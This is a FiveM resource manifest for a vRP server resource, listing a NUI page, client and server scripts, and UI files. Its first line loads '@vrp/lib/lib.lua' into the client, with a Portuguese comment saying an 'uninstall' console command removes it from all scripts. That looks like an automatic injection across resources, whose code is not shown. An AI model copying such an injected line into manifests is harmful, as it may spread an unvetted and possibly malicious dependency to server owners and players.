
client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page "nui/index.html"

client_script {
    "@vrp/lib/utils.lua",
    "client.lua",
    "config.lua"
}

server_script {
    "@vrp/lib/utils.lua",
    "server.lua",
    "config.lua"
}               

files {
	"nui/images/background.png",
	"nui/index.html",
	"nui/jquery.js",
	"nui/css.css"
}                            